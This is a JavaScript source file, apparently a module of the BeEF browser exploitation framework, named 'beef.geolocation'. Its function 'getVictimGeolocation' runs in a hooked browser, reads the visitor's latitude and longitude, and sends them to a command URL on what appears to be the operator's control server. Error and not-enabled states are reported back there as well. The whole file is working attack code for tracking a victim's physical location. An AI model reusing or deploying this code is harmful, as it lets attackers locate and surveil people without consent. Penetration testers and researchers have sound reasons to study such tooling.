/*!
 * @literal object: beef.geolocation
 *
 * Provides functionalities to use the geolocation API.
 */
beef.geolocation = {

    /**
     * check if browser supports the geolocation API
     */
    isGeolocationEnabled: function(){
        var isEnabled = false;

        if (navigator.geolocation) {
            isEnabled = true;
        }

        return isEnabled;
    },

    /*
     * retrieve latitude/longitude using the geolocation API
     */
    getVictimGeolocation: function (command_url, command_id){
        //var result = null;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
					function(position){ //note: this is an async call
							var latitude = position.coords.latitude;
        					var longitude = position.coords.longitude;
                            beef.net.sendback(command_url, command_id, "geoLocEnabled=true&latitude=" + latitude + "&longitude=" + longitude);

				    }, function(position){
                        beef.net.sendback(command_url, command_id, "latitude=ERROR&longitude=ERROR");
					});
        } else {
	        beef.net.sendback(command_url, command_id, "latitude=NOT_ENABLED&longitude=NOT_ENABLED");
        }
    }
}

beef.regCmp('beef.geolocation');